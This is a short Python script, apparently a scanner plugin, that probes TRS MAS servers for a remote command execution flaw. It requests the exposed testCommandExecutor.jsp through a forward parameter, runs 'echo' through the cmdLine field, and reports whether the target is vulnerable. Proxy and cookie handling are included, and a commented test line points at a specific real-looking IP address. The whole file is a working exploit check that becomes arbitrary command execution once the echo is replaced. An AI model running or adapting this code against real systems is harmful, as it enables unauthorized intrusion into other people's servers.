import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        gf = requests.get(url+'/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=echo TestbyZsf&workDir=&pathEnv=&libPathEnv=',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if gf.status_code == 200 and '<title>测试命令行进程执行</title>' in gf.text and 'TRSMAS' in gf.text:
            uia = '[+]漏洞存在\n/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=echo TestbyZsf&workDir=&pathEnv=&libPathEnv=\n'+gf.text
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://58.63.47.210:14430/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ TRS MAS testCommandExecutor.jsp RCE ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)